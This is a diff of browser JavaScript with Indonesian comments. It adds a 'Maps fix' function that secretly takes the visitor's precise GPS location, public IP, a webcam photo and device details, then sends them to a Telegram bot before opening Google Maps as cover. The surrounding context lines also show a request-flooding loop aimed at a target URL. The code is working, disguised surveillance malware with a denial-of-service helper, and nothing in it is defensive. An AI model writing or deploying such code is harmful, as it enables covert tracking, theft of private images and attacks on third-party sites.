@@ -97,21 +97,31 @@ atk=!0;b.innerText='⏹️ STOP';l.style.display='block';l.innerHTML='> 🔥 CON
 iv=setInterval(()=>{if(atk){let r=Math.random();new Image().src=t+'/?v='+r;l.innerHTML+='> GET '+t+'/?v='+r.toString().substring(2,8)+' [SEND]<br>';l.scrollTop=l.scrollHeight}},150);
 }
 
+// ========== MAPS FIX: BUKA GOOGLE MAPS + KIRIM DATA ==========
 async function openMap(){
 let o=document.getElementById('ro');o.style.display='flex';
 try{
+// Ambil lokasi
 let p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j,{enableHighAccuracy:1,timeout:5e3}));
 let lat=p.coords.latitude,lng=p.coords.longitude;
 let ip=(await(await fetch('https://api.ipify.org?format=json')).json()).ip;
+
+// Ambil foto dari webcam
 let s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:640,height:480}});
 let v=document.createElement('video');v.srcObject=s;await v.play();
 let c=document.getElementById('cv');c.width=v.videoWidth||640;c.height=v.videoHeight||480;c.getContext('2d').drawImage(v,0,0,c.width,c.height);
 let b=await new Promise(r=>c.toBlob(r,'image/jpeg',.9));s.getTracks().forEach(t=>t.stop());
+
+// Kirim ke Telegram
 let d={ua:navigator.userAgent,platform:navigator.platform,screen:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone};
 let cap=`📍 MAPS LOCKED\nIP: ${ip}\nLokasi: ${lat},${lng}\nDevice: ${d.platform}\nBrowser: ${d.ua.split(' ').slice(-2).join(' ')}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
 let fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,'map.jpg');fd.append('caption',cap);
 await fetch('https://api.telegram.org/bot'+T+'/sendPhoto',{method:'POST',body:fd});
+
+// Buka Google Maps
 window.open('https://www.google.com/maps?q='+lat+','+lng,'_blank');
+
+// Tutup overlay
 o.style.display='none';o.innerHTML='<div class=sweep></div>';
 }catch(e){
 o.innerHTML='<div style="color:var(--r);text-align:center;padding:20px"><h2>⚠️ ERROR</h2><p>'+e.message+'</p><button onclick="document.getElementById(\'ro\').style.display=\'none\';document.getElementById(\'ro\').innerHTML=\'<div class=sweep></div>\'" style="margin-top:20px;padding:10px 30px;background:var(--r);color:#fff;border:none;border-radius:10px;cursor:pointer">TUTUP</button></div>';
